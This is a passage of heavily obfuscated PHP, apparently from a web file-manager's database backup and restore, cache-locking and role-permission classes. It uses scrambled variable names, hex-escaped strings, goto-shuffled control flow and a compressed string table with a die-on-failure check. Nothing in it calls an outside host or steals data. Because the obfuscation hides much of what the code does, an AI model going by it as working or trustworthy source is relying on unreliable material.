$fÁÛÆ öÇª[$FË¨¸˜½¤ï[290]] = $eƒøÊêˆˆ . $FË¨¸˜½¤ï[47] . $eÙ²ÚÍ“; } if (think_config($FË¨¸˜½¤ï[1037])) { $BÊ…ºëÕší = $FË¨¸˜½¤ï[1038] . md5(serialize($fÁÛÆ öÇª)); $Aš±ç–…ˆ’ = think_cache($BÊ…ºëÕší); if ($Aš±ç–…ˆ’) { return $Aš±ç–…ˆ’; } } goto Eåª÷’îİ; fÂ·ÎÇ—“: } public function parseSql($E¡èÔ–ƒÍõ, $aÁ‰îÉÀñâ = array()) { $FÏ¯Ää’Š =& $_SERVER[Ö‘Øù]; $E¡èÔ–ƒÍõ = str_replace(array($FÏ¯Ää’Š[1039], $FÏ¯Ää’Š[1040], $FÏ¯Ää’Š[1041], $FÏ¯Ää’Š[1042], $FÏ¯Ää’Š[1043], $FÏ¯Ää’Š[1044], $FÏ¯Ää’Š[1045], $FÏ¯Ää’Š[1046], $FÏ¯Ää’Š[1047], $FÏ¯Ää’Š[1048], $FÏ¯Ää’Š[1049]), array($this->parseTable("{$aÁ‰îÉÀñâ[$FÏ¯Ää’Š[277]]}"), $this->parseDistinct(isset($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[1050]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[1050]] : !1), $this->parseField(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[271]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[271]] : $FÏ¯Ää’Š[182]), $this->parseJoin(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[280]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[280]] : $FÏ¯Ää’Š[33]), $this->parseWhere(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[273]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[273]] : $FÏ¯Ää’Š[33]), $this->parseGroup(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[510]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[510]] : $FÏ¯Ää’Š[33]), $this->parseHaving(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[1051]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[1051]] : $FÏ¯Ää’Š[33]), $this->parseOrder(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[363]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[363]] : $FÏ¯Ää’Š[33]), $this->parseLimit(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[290]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[290]] : $FÏ¯Ää’Š[33]), $this->parseUnion(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[345]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[345]] : $FÏ¯Ää’Š[33]), $this->parseComment(!empty($aÁ‰îÉÀñâ[$FÏ¯Ää’Š[352]]) ? $aÁ‰îÉÀñâ[$FÏ¯Ää’Š[352]] : $FÏ¯Ää’Š[33])), $E¡èÔ–ƒÍõ); return $E¡èÔ–ƒÍõ; } public function getLastSql($fÁ›—É¤•Ô = '') { return $fÁ›—É¤•Ô ? $this->modelSql[$fÁ›—É¤•Ô] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($CÔ°®«¡¼É) { return addslashes($CÔ°®«¡¼É); } public function setModel($fƒéèßô÷) { $this->model = $fƒéèßô÷; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($FªŠ²Æ¤‚¶, $eÚÆÑ‡Ù÷ = '') { $this->database = $FªŠ²Æ¤‚¶; $this->type = $eÚÆÑ‡Ù÷; } public function model($BŠ´¨ÏÙìï = '') { return new ModelBase($BŠ´¨ÏÙìï, $_SERVER[Ö‘Øù][33], $this->database); } public function db($cæÍ˜ƒ˜ÕÎ = false) { goto AìÑ¸°Ä¤©; CˆÕáçš›¾: $c‚¡¸’ÒÂ = $F™ù¨¡ßŞÄ[$f„À”§¤¨ö[965]]; $F™ù¨¡ßŞÄ[$f„À”§¤¨ö[965]] = $f„À”§¤¨ö[33]; if ($F™ù¨¡ßŞÄ[$f„À”§¤¨ö[789]] == $f„À”§¤¨ö[790]) { $dò¡µ§˜èß = $F™ù¨¡ßŞÄ[$f„À”§¤¨ö[791]]; $F™ù¨¡ßŞÄ[$f„À”§¤¨ö[791]] = substr($dò¡µ§˜èß, 0, strrpos($dò¡µ§˜èß, $f„À”§¤¨ö[1052])); } goto b×“Éâğ°‚; b«Ò –«›: if (!$bã¿É†ƒˆ) { $AÁ†Ú·çÍ->execute("\x63\162\x65\141\164\x65\40\144\141\164\141\x62\141\x73\x65\40\140{$c‚¡¸’ÒÂ}\140"); } $F™ù¨¡ßŞÄ[$f„À”§¤¨ö[965]] = $c‚¡¸’ÒÂ; if ($F™ù¨¡ßŞÄ[$f„À”§¤¨ö[789]] == $f„À”§¤¨ö[790]) { $F™ù¨¡ßŞÄ[$f„À”§¤¨ö[791]] .= $f„À”§¤¨ö[1052] . $c‚¡¸’ÒÂ; } goto C›ˆ¦©©àì; C›ˆ¦©©àì: $this->database = $F™ù¨¡ßŞÄ; $AÁ†Ú·çÍ->execute("\x75\163\x65\40\140{$c‚¡¸’ÒÂ}\x60"); return $AÁ†Ú·çÍ; goto AŒœ²Åá; b×“Éâğ°‚: $this->database = $F™ù¨¡ßŞÄ; $AÁ†Ú·çÍ = $this->model()->db(); try { $bã¿É†ƒˆ = $AÁ†Ú·çÍ->execute("\163\x68\157\167\40\144\x61\x74\141\x62\141\163\x65\x73\x20\x6c\x69\x6b\x65\x20\x27{$c‚¡¸’ÒÂ}\47"); } catch (Exception $EËøÅ‡ˆ‚È) { } goto b«Ò –«›; AìÑ¸°Ä¤©: $f„À”§¤¨ö =& $_SERVER[Ö‘Øù]; $F™ù¨¡ßŞÄ = array_change_key_case($this->database); if ($this->type == $f„À”§¤¨ö[9] || !$cæÍ˜ƒ˜ÕÎ) { return $this->model()->db(); } goto CˆÕáçš›¾; AŒœ²Åá: } public function createTable($dâßè¦¡·, $e«èòÜÂÎÆ = null) { $E¦‡ƒÄŞ©¿ =& $_SERVER[Ö‘Øù]; if (!IO::exist($dâßè¦¡·)) { ActionCall($E¦‡ƒÄŞ©¿[1053], !0, 0); show_json(LNG($E¦‡ƒÄŞ©¿[1054]), !1); } $B¹ÚÎ˜ª¢§ = sqlSplit(IO::getContent($dâßè¦¡·)); foreach ($B¹ÚÎ˜ª¢§ as $c¶Ä“ïÕ§¸) { if ($e«èòÜÂÎÆ) { $fÛØ ÜßŠ§ = stripos($c¶Ä“ïÕ§¸, $E¦‡ƒÄŞ©¿[1055]) === 0; if ($fÛØ ÜßŠ§) { $e«èòÜÂÎÆ->task[$E¦‡ƒÄŞ©¿[1056]] += 1; } } $this->model()->db()->execute($c¶Ä“ïÕ§¸); if ($e«èòÜÂÎÆ && $fÛØ ÜßŠ§) { preg_match($E¦‡ƒÄŞ©¿[1057], $c¶Ä“ïÕ§¸, $C‰åÈŠ’ç³); $e«èòÜÂÎÆ->task[$E¦‡ƒÄŞ©¿[1058]] = $C‰åÈŠ’ç³[1]; $e«èòÜÂÎÆ->update(1); } } $this->taskToCache($e«èòÜÂÎÆ); } public function insertTable($D†•ËØ¾š¢, $côÖ–âÛ¨» = null) { $E¶Şç«´ =& $_SERVER[Ö‘Øù]; $E’Ø­³Ø˜ = $this->model()->db(); $Eó§³³Â˜Í = $fîíÅ„”†“ ? array($fîíÅ„”†“) : $E’Ø­³Ø˜->getTables(); foreach ($D†•ËØ¾š¢ as $dÖìŸÎñÚ‘) { $fîíÅ„”†“ = basename($dÖìŸÎñÚ‘, $E¶Şç«´[779]); if (!in_array($fîíÅ„”†“, $Eó§³³Â˜Í)) { continue; } if ($côÖ–âÛ¨») { $côÖ–âÛ¨»->task[$E¶Şç«´[1058]] = $fîíÅ„”†“; } if (get_filesize($dÖìŸÎñÚ‘) == 0) { continue; } $b„’¨ä¾³Ñ = $this->sqlToDb($dÖìŸÎñÚ‘, $côÖ–âÛ¨»); if (!$b„’¨ä¾³Ñ) { ActionCall($E¶Şç«´[1053], !0, 0); show_json(LNG($E¶Şç«´[1059]) . "\133{$fîíÅ„”†“}\135", !1); } } $this->taskToCache($côÖ–âÛ¨»); } public function sqlFromDb($cÔùœéÓ’´, $aÈ¶õ°ßÅä, $fœ›÷áÀÎ = null, $a¶Ùâ„š¦ = null) { goto eî¡¢Åñø”; c´§–ï‡Ñ³: $CŸ·›Óô¼³ = 0; $eõˆ¶ÓÚ¾ = 10000; $c¥Ø»ÂÁòò = fopen($aÈ¶õ°ßÅä, $_SERVER[Ö‘Øù][1060]); goto D”æÎ¬†¹•; D”æÎ¬†¹•: $BÓğÁŒâÜ = $bš¡÷×´±Ë->getPk(); $dİÃƒóİø = $bš¡÷×´±Ë->getDbFields(); do { $d·®İÜª„Š = array($BÓğÁŒâÜ => array($_SERVER[Ö‘Øù][1007], $CŸ·›Óô¼³)); $cç¢¯¥ô˜ = $bš¡÷×´±Ë->where($d·®İÜª„Š)->field($dİÃƒóİø)->order($BÓğÁŒâÜ . $_SERVER[Ö‘Øù][1061])->limit($eõˆ¶ÓÚ¾)->select(); $cç¢¯¥ô˜ = !empty($cç¢¯¥ô˜) ? $cç¢¯¥ô˜ : array(); if (!($bÇ“ƒÎˆÍĞ = count($cç¢¯¥ô˜))) { break; } $fĞÆ‹÷Ï¿° = end($cç¢¯¥ô˜); $CŸ·›Óô¼³ = $fĞÆ‹÷Ï¿°[$BÓğÁŒâÜ]; $aé–Ä‡»Ü = array(); foreach ($cç¢¯¥ô˜ as $eÏÔ›£ßĞ±) { if ($cÔùœéÓ’´ == $_SERVER[Ö‘Øù][1062] && $eÏÔ›£ßĞ±[$_SERVER[Ö‘Øù][29]] == $_SERVER[Ö‘Øù][1063]) { $bÆ‰¸â‡‰ö = json_decode($eÏÔ›£ßĞ±[$_SERVER[Ö‘Øù][372]], !0); if ($bÆ‰¸â‡‰ö[$_SERVER[Ö‘Øù][28]] == date($_SERVER[Ö‘Øù][744]) && !$bÆ‰¸â‡‰ö[$_SERVER[Ö‘Øù][743]]) { continue; } } if ($a¶Ùâ„š¦) { $eÏÔ›£ßĞ±[$_SERVER[Ö‘Øù][76]] = "\x7b\x69\157\72{$a¶Ùâ„š¦}\175" . substr($eÏÔ›£ßĞ±[$_SERVER[Ö‘Øù][76]], strlen("\173\x69\x6f\72{$eÏÔ›£ßĞ±[$_SERVER[Ö‘Øù][817]]}\175")); $eÏÔ›£ßĞ±[$_SERVER[Ö‘Øù][817]] = $a¶Ùâ„š¦; } $aé–Ä‡»Ü[] = $_SERVER[Ö‘Øù][1064] . $this->sqlEncode($eÏÔ›£ßĞ±) . $_SERVER[Ö‘Øù][1065]; } $a‘’èßÓ‘· = "\111\x4e\123\105\x52\x54\40\x49\116\x54\117\40\x60{$cÔùœéÓ’´}\140\x20\50\x60" . implode($_SERVER[Ö‘Øù][1066], $dİÃƒóİø) . $_SERVER[Ö‘Øù][1067]; fwrite($c¥Ø»ÂÁòò, $a‘’èßÓ‘· . implode($_SERVER[Ö‘Øù][1068], $aé–Ä‡»Ü) . $_SERVER[Ö‘Øù][68] . PHP_EOL); $BÇô»ªÛÔ += $bÇ“ƒÎˆÍĞ; if ($fœ›÷áÀÎ) { $fœ›÷áÀÎ->update($bÇ“ƒÎˆÍĞ); } } while ($eõˆ¶ÓÚ¾ == $bÇ“ƒÎˆÍĞ); goto BØÀÓ “; BØÀÓ “: fclose($c¥Ø»ÂÁòò); return $BÇô»ªÛÔ; goto C¢¨öğÌÅ; eî¡¢Åñø”: if ($fœ›÷áÀÎ) { $fœ›÷áÀÎ->task[$_SERVER[Ö‘Øù][1058]] = $cÔùœéÓ’´; } $bš¡÷×´±Ë = $this->model($cÔùœéÓ’´); $BÇô»ªÛÔ = 0; goto c´§–ï‡Ñ³; C¢¨öğÌÅ: } public function sqlToDb($f½„èÒ¶‘ß, $CÜì™È¿ = null) { goto C‘â¨¢Ø×; d³ñÙàÊë…: while (!feof($DÉö‘ÙµáÜ)) { $Cäë´®í¡È = trim(fgets($DÉö‘ÙµáÜ)); if (!$Cäë´®í¡È) { continue; } $aö”ÔÀÉÏ = $this->sqlDecode($Cäë´®í¡È, $this->type); if (stripos($aö”ÔÀÉÏ, $F¥åˆ²¼ù†[353]) === 0) { if (!$D¨Õ‡„¨Ô) { $D¨Õ‡„¨Ô = $aö”ÔÀÉÏ . $F¥åˆ²¼ù†[50]; } continue; } if ($CÜì™È¿) { $CÜì™È¿->task[$F¥åˆ²¼ù†[1056]] += 1; } $AÓ…¯Úİ´++; $E®ƒáÉ§Â³[] = rtrim(rtrim(trim($aö”ÔÀÉÏ), $F¥åˆ²¼ù†[47]), $F¥åˆ²¼ù†[68]); $CÚÉŞ˜ç·ù = null; $bÖ³…î¡í« = strlen($aö”ÔÀÉÏ); $eÜŒÜ¦°­Ò += $bÖ³…î¡í«; if ($eÜŒÜ¦°­Ò >= ($dÆÀÂÕä‰ == 500 ? $F•¯ğùÙš : $b¿øäå¶è)) { $CÚÉŞ˜ç·ù = array_pop($E®ƒáÉ§Â³); if ($AÓ…¯Úİ´ > 1) { $AÓ…¯Úİ´--; } } if ($AÓ…¯Úİ´ >= $dÆÀÂÕä‰ || $CÚÉŞ˜ç·ù) { goto Eˆïùèç™ô; Eˆïùèç™ô: $aö”ÔÀÉÏ = $D¨Õ‡„¨Ô . implode($F¥åˆ²¼ù†[47], $E®ƒáÉ§Â³); if (!$E‚›ÖÔË¡—->execute($aö”ÔÀÉÏ)) { return !1; } if ($CÜì™È¿) { $CÜì™È¿->update($AÓ…¯Úİ´); } goto CëÙä‡Ä§; CëÙä‡Ä§: $E®ƒáÉ§Â³ = array(); $AÓ…¯Úİ´ = 0; $eÜŒÜ¦°­Ò = 0; goto Fá–¿ÉÚ; Fá–¿ÉÚ: if ($CÚÉŞ˜ç·ù) { $E®ƒáÉ§Â³ = array($CÚÉŞ˜ç·ù); $AÓ…¯Úİ´ = 1; $eÜŒÜ¦°­Ò = $bÖ³…î¡í«; } goto e¢·ñ†Øä¦; e¢·ñ†Øä¦: } } fclose($DÉö‘ÙµáÜ); if (!empty($E®ƒáÉ§Â³)) { $aö”ÔÀÉÏ = $D¨Õ‡„¨Ô . implode($F¥åˆ²¼ù†[47], $E®ƒáÉ§Â³); if (!$E‚›ÖÔË¡—->execute($aö”ÔÀÉÏ)) { return !1; } if ($CÜì™È¿) { $CÜì™È¿->update($AÓ…¯Úİ´); } } goto f³ïğÂ›õ¥; C‘â¨¢Ø×: $F¥åˆ²¼ù† =& $_SERVER[Ö‘Øù]; $E‚›ÖÔË¡— = $this->model()->db(); $DÉö‘ÙµáÜ = @fopen($f½„èÒ¶‘ß, $F¥åˆ²¼ù†[1069]); goto aœÎ÷Œåò•; f³ïğÂ›õ¥: return !0; goto a¸Ëƒò„íö; båŠÙ¦: $E®ƒáÉ§Â³ = array(); $dÆÀÂÕä‰ = $this->type == $F¥åˆ²¼ù†[9] ? 500 : 2000; $aŠ”„ê¡“¶ = basename($f½„èÒ¶‘ß, $F¥åˆ²¼ù†[779]); goto aÀæÇÙé„; aÀæÇÙé„: $eÜŒÜ¦°­Ò = 0; $F•¯ğùÙš = 4194304 - 104858; $b¿øäå¶è = 1000000 - 104858; goto d³ñÙàÊë…; aœÎ÷Œåò•: if (!$DÉö‘ÙµáÜ) { return !1; } $AÓ…¯Úİ´ = 0; $D¨Õ‡„¨Ô = $F¥åˆ²¼ù†[33]; goto båŠÙ¦; a¸Ëƒò„íö: } public function dropTable($b£Ù¶ÉĞê = null) { $Eó¼®‘ƒÍÎ = $this->model()->db(); $cŞ°íÜ¸šĞ = $b£Ù¶ÉĞê ? array($b£Ù¶ÉĞê) : $Eó¼®‘ƒÍÎ->getTables(); if (!$cŞ°íÜ¸šĞ) { return; } foreach ($cŞ°íÜ¸šĞ as $b£Ù¶ÉĞê) { if ($b£Ù¶ÉĞê) { $b£Ù¶ÉĞê = strtolower($b£Ù¶ÉĞê); } else { continue; } $Eó¼®‘ƒÍÎ->execute("\x64\x72\157\160\40\164\x61\142\154\x65\40\151\146\40\x65\170\151\x73\x74\x73\x20\x60{$b£Ù¶ÉĞê}\x60"); } } private function taskToCache($bßÀ¹±Î…… = null) { $aÈê‡‡Ì‹ =& $_SERVER[Ö‘Øù]; if (!$bßÀ¹±Î……) { return; } $EàÔ‡ê”¨ = array($aÈê‡‡Ì‹[1058] => $bßÀ¹±Î……->task[$aÈê‡‡Ì‹[1058]], $aÈê‡‡Ì‹[1056] => $bßÀ¹±Î……->task[$aÈê‡‡Ì‹[1056]], $aÈê‡‡Ì‹[1070] => $bßÀ¹±Î……->task[$aÈê‡‡Ì‹[1070]]); if ($EàÔ‡ê”¨[$aÈê‡‡Ì‹[1056]] == $EàÔ‡ê”¨[$aÈê‡‡Ì‹[1070]]) { $EàÔ‡ê”¨[$aÈê‡‡Ì‹[753]] = 1; } Cache::set($aÈê‡‡Ì‹[1071] . $bßÀ¹±Î……->task[$aÈê‡‡Ì‹[395]], $EàÔ‡ê”¨); $bßÀ¹±Î……->end(); } private function sqlEncode($EÕ÷Ø„ÉÑ) { $C¤‰®ñ‘ùÀ =& $_SERVER[Ö‘Øù]; $aßŸİ¨Á· = array(); foreach ($EÕ÷Ø„ÉÑ as $BÎ¤ù¨ ÅÛ) { if (is_array($BÎ¤ù¨ ÅÛ)) { $BÎ¤ù¨ ÅÛ = json_encode_force($BÎ¤ù¨ ÅÛ); } $BÎ¤ù¨ ÅÛ = addslashes($BÎ¤ù¨ ÅÛ); $BÎ¤ù¨ ÅÛ = str_replace(array($C¤‰®ñ‘ùÀ[1072], $C¤‰®ñ‘ùÀ[229]), array($C¤‰®ñ‘ùÀ[1073], $C¤‰®ñ‘ùÀ[1074]), $BÎ¤ù¨ ÅÛ); $aßŸİ¨Á·[] = str_replace($C¤‰®ñ‘ùÀ[55], $C¤‰®ñ‘ùÀ[1075], $BÎ¤ù¨ ÅÛ); } return $C¤‰®ñ‘ùÀ[55] . implode($C¤‰®ñ‘ùÀ[1076], $aßŸİ¨Á·) . $C¤‰®ñ‘ùÀ[55]; } private function sqlDecode($E²×Õ‡¬ò, $f‘¹ÄùË«³) { $B‰¾İªô­‹ =& $_SERVER[Ö‘Øù]; $E²×Õ‡¬ò = str_replace(array($B‰¾İªô­‹[1073], $B‰¾İªô­‹[1074]), array($B‰¾İªô­‹[1072], $B‰¾İªô­‹[229]), $E²×Õ‡¬ò); if ($f‘¹ÄùË«³ == $B‰¾İªô­‹[9]) { $E²×Õ‡¬ò = stripslashes($E²×Õ‡¬ò); } return $E²×Õ‡¬ò; } } goto A‡µŒ…Å; e—•Õ‘å·ù: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $CÕ¤Üæ’Üö =& $_SERVER[Ö‘Øù]; $f¢Ÿ°è™»Ú = $GLOBALS[$CÕ¤Üæ’Üö[6]][$CÕ¤Üæ’Üö[347]]; self::$cachePath = $f¢Ÿ°è™»Ú[$CÕ¤Üæ’Üö[193]][$CÕ¤Üæ’Üö[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($dÉÚ£Şõµ¬, $d¿¶¿Ğ­  = 0) { goto d‘ì§Ê—ÃÇ; f‰“›Ë‰¢: $DœòŞİ‹ì = rtrim(self::$cachePath, $C¸ŒôøœÂª[8]) . $C¸ŒôøœÂª[860] . md5($dÉÚ£Şõµ¬) . $C¸ŒôøœÂª[857]; if (file_exists($DœòŞİ‹ì) && filemtime($DœòŞİ‹ì) && filemtime($DœòŞİ‹ì) < time() - 10) { @unlink($DœòŞİ‹ì); } do { if (file_exists($DœòŞİ‹ì)) { cacheLockWait(); continue; } $fê—ŠÈëÈ = fopen($DœòŞİ‹ì, $C¸ŒôøœÂª[861]); if (!$fê—ŠÈëÈ) { return !1; } $d»ÀğµˆÅ  = flock($fê—ŠÈëÈ, LOCK_EX | LOCK_NB); self::$caches[$dÉÚ£Şõµ¬] = array($C¸ŒôøœÂª[862] => $fê—ŠÈëÈ, $C¸ŒôøœÂª[193] => $DœòŞİ‹ì); fwrite($fê—ŠÈëÈ, $aˆ„ÃÜÇê); clearstatcache(); if ($fê—ŠÈëÈ && $d»ÀğµˆÅ ) { return !0; } cacheLockWait(); } while (microtime(!0) < $aˆ„ÃÜÇê); goto E‰ Ë‘ƒ‰Ü; d‘ì§Ê—ÃÇ: $C¸ŒôøœÂª =& $_SERVER[Ö‘Øù]; $fÄ¢¦„…ŠÜ = microtime(!0); $aˆ„ÃÜÇê = $fÄ¢¦„…ŠÜ + $d¿¶¿Ğ­  + 0.0001; goto f‰“›Ë‰¢; E‰ Ë‘ƒ‰Ü: $this->unlock($dÉÚ£Şõµ¬); return !1; goto C­™™§Ñ’Ü; C­™™§Ñ’Ü: } public function lockGet($a£‚˜íÕë®) { $A¶®§š‚è =& $_SERVER[Ö‘Øù]; $Bïâ¡ŸšÃ§ = rtrim(self::$cachePath, $A¶®§š‚è[8]) . $A¶®§š‚è[860] . md5($a£‚˜íÕë®) . $A¶®§š‚è[857]; return file_exists($Bïâ¡ŸšÃ§); } public function unlock($a’Ó¦»ÃÉª) { goto døÇ§®ó; dèÙŸ®Œë: unset(self::$caches[$a’Ó¦»ÃÉª]); goto eŒé–æ˜Å; døÇ§®ó: $f¦†ÑÁÊĞ =& $_SERVER[Ö‘Øù]; $dó¼Šä§¼£ = self::$caches[$a’Ó¦»ÃÉª]; if (!$dó¼Šä§¼£) { return; } goto F™ºÙíÀìù; F™ºÙíÀìù: @flock($dó¼Šä§¼£[$f¦†ÑÁÊĞ[862]], LOCK_UN); @fclose($dó¼Šä§¼£[$f¦†ÑÁÊĞ[862]]); @unlink($dó¼Šä§¼£[$f¦†ÑÁÊĞ[193]]); goto dèÙŸ®Œë; eŒé–æ˜Å: } } class CacheLockRedis { public function lock($eÑï×òñ‚‹, $AÎÏ÷ÑÒ¬¨ = 10) { $A¨…†àÂ¤ = Cache::init(); $B‡ïÌË‘¤ = microtime(!0) + $AÎÏ÷ÑÒ¬¨; while (microtime(!0) < $B‡ïÌË‘¤) { $cÎïºÔ‡¼Ù = $A¨…†àÂ¤->get($eÑï×òñ‚‹); if (!$cÎïºÔ‡¼Ù) { $Bë»½Å…œõ = $A¨…†àÂ¤->setLock($eÑï×òñ‚‹, $B‡ïÌË‘¤, $AÎÏ÷ÑÒ¬¨); if ($Bë»½Å…œõ) { return !0; } } else { if ($cÎïºÔ‡¼Ù < microtime(!0)) { $A¨…†àÂ¤->set($eÑï×òñ‚‹, $B‡ïÌË‘¤, $AÎÏ÷ÑÒ¬¨ * 2); if ($A¨…†àÂ¤->get($eÑï×òñ‚‹) === $cÎïºÔ‡¼Ù) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($b³³¡Ÿèâ) { return Cache::init()->get($b³³¡Ÿèâ); } public function unlock($bµ¬ˆ¨æ¹‘) { return Cache::init()->remove($bµ¬ˆ¨æ¹‘); } } class CacheLockMemcached { public function lock($c£¸›õ¦ò¥, $dœ¶éæ®¸ = 0) { $F‘¾ÇéÑÄñ = Cache::init(); $c·ŒïÉÙÜÁ = microtime(!0) + $dœ¶éæ®¸; while (microtime(!0) < $c·ŒïÉÙÜÁ) { $f¡ëÈ‘ºğ = $F‘¾ÇéÑÄñ->get($c£¸›õ¦ò¥); if (!$f¡ëÈ‘ºğ || $f¡ëÈ‘ºğ < microtime(!0)) { $fÈàŸ¾‘çá = $F‘¾ÇéÑÄñ->handle->add($c£¸›õ¦ò¥, $c·ŒïÉÙÜÁ, $dœ¶éæ®¸); if ($fÈàŸ¾‘çá) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a‡¾æÆ›Íß) { return Cache::init()->get($a‡¾æÆ›Íß); } public function unlock($Aóœ»Ê£Ã‘) { return Cache::init()->remove($Aóœ»Ê£Ã‘); } } goto a‚çõ õù; d÷…ŠŠ±: $BÈÊé»æ¦¡ = $_SERVER[Ö‘Øù][601]; if (strlen($BÈÊé»æ¦¡) < $_SERVER[Ö‘Øù][602]) { die; } $_SERVER[£Õıúå] = explode($_SERVER[Ö‘Øù][603], gzinflate(substr($_SERVER[Ö‘Øù][604], 10, -8))); goto d‡Ô–õ‹†â; aˆÀÙ¨Ö¦È: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\x72\157\x6c\145\x4c\x69\x73\164"; public $field = array("\156\141\x6d\145", "\x61\x75\164\150", "\154\141\142\x65\x6c", "\144\x69\163\x70\154\141\x79", "\163\x79\163\164\145\155", "\144\x65\x73\143", "\x69\147\156\x6f\162\x65\x45\170\x74", "\x69\x67\156\x6f\162\145\106\151\154\145\123\151\172\145", "\x61\144\x6d\151\x6e\151\163\164\162\x61\x74\157\x72", "\x73\x6f\x72\x74"); public function listData($a³±ÄÜ–±° = false, $b¸ÛÒÎ«† = "\x73\157\162\x74", $fİ«³×õ‘• = false) { $BÂ­İÇÅ°¸ =& $_SERVER[Ö‘Øù]; $BŸå¾èõ© = parent::listData($a³±ÄÜ–±°, $b¸ÛÒÎ«†, $fİ«³×õ‘•); if (!$a³±ÄÜ–±°) { foreach ($BŸå¾èõ© as $FÚƒØŸˆ’Ì => $bÌƒÕ–ƒÑË) { if ($bÌƒÕ–ƒÑË[$BÂ­İÇÅ°¸[1922]] == 1) { $BŸå¾èõ©[$FÚƒØŸˆ’Ì][$BÂ­İÇÅ°¸[446]] = LNG($BÂ­İÇÅ°¸[2146]); } } } return $BŸå¾èõ©; } public function update($cò¬Ë‚–ªØ, $eµø àé‡¹) { goto BŒÁ÷áÕĞ; BğŠÕéöç: if (!$DˆŸÙ‚¬…Ä || $B³˜Ëâáğ„ && $B³˜Ëâáğ„[$bÊ²ç¼§§ñ[395]] != $DˆŸÙ‚¬…Ä[$bÊ²ç¼§§ñ[395]]) { return !1; } if ($B³˜Ëâáğ„[$bÊ²ç¼§§ñ[1922]] == 1) { $eµø àé‡¹ = array($bÊ²ç¼§§ñ[28] => $eµø àé‡¹[$bÊ²ç¼§§ñ[28]], $bÊ²ç¼§§ñ[1752] => $eµø àé‡¹[$bÊ²ç¼§§ñ[1752]]); } $this->filterAuth($eµø àé‡¹[$bÊ²ç¼§§ñ[408]]); goto Aê¡Ò¾Áõ’; Aê¡Ò¾Áõ’: return parent::update($cò¬Ë‚–ªØ, $eµø àé‡¹); goto dèï——Ğã‡; BŒÁ÷áÕĞ: $bÊ²ç¼§§ñ =& $_SERVER[Ö‘Øù]; $DˆŸÙ‚¬…Ä = parent::listData($cò¬Ë‚–ªØ); $B³˜Ëâáğ„ = $this->findByName($eµø àé‡¹[$bÊ²ç¼§§ñ[28]]); goto BğŠÕéöç; dèï——Ğã‡: } public function remove($B²è×°ß«¦) { $D×ô›×åÌ = parent::listData($B²è×°ß«¦); if (!$D×ô›×åÌ || $D×ô›×åÌ[$_SERVER[Ö‘Øù][1205]]) { return !1; } return parent::remove($B²è×°ß«¦); } public function add($eÚ­–»“ª) { goto AöåÁ¯ÎØ˜; AöåÁ¯ÎØ˜: $aïÃÀ§ªî½ =& $_SERVER[Ö‘Øù]; $A½ëÑì = $eÚ­–»“ª[$aïÃÀ§ªî½[28]]; if ($this->findByName($A½ëÑì)) { return !1; } goto bóÙßÎ»°Ü; bóÙßÎ»°Ü: $C“›—ç¸ = array($aïÃÀ§ªî½[415] => $A½ëÑì, $aïÃÀ§ªî½[1736] => $aïÃÀ§ªî½[33], $aïÃÀ§ªî½[1732] => $aïÃÀ§ªî½[1740], $aïÃÀ§ªî½[2147] => 1, $aïÃÀ§ªî½[1735] => 0, $aïÃÀ§ªî½[2148] => 0, $aïÃÀ§ªî½[1734] => $this->getSort()); $eÚ­–»“ª = array_merge($C“›—ç¸, $eÚ­–»“ª); $this->filterAuth($eÚ­–»“ª[$aïÃÀ§ªî½[408]]); goto F®è½·æõ·; F®è½·æõ·: return parent::insert($eÚ­–»“ª); goto bª–’Í‰ªÈ; bª–’Í‰ªÈ: } private function getSort() { $b°¢£„½ =& $_SERVER[Ö‘Øù]; $A“‰›íÃñ = parent::listData(); $D†çšò“°Ô = array_to_keyvalue($A“‰›íÃñ, $b°¢£„½[33], $b°¢£„½[1753]); return empty($D†çšò“°Ô) ? 0 : max($D†çšò“°Ô) + 1; } private function filterAuth(&$Dè‹˜õÂÀª) { $BŸŠ—¡”´Ç =& $_SERVER[Ö‘Øù]; $fØ¥®ªò¸Š = array(); $fÁŒñ¦ÂÔò = array_filter(explode($BŸŠ—¡”´Ç[47], $Dè‹˜õÂÀª)); foreach ($fÁŒñ¦ÂÔò as $Dè‹˜õÂÀª) { $C…™ˆ˜Ò¨Ï = explode($BŸŠ—¡”´Ç[95], $Dè‹˜õÂÀª); if ($C…™ˆ˜Ò¨Ï[0] == $BŸŠ—¡”´Ç[2149] && $C…™ˆ˜Ò¨Ï[1] != $BŸŠ—¡”´Ç[1124]) { $d‘ª¹Õ®éõ = $C…™ˆ˜Ò¨Ï[0] . $BŸŠ—¡”´Ç[95] . $C…™ˆ˜Ò¨Ï[1] . $BŸŠ—¡”´Ç[2150]; if (!in_array($d‘ª¹Õ®éõ, $fÁŒñ¦ÂÔò)) { $fØ¥®ªò¸Š[] = $d‘ª¹Õ®éõ; } } $fØ¥®ªò¸Š[] = $Dè‹˜õÂÀª; } $Dè‹˜õÂÀª = implode($BŸŠ—¡”´Ç[47], $fØ¥®ªò¸Š); } public function sort($aŒ‚ ŠŒ¡¡, 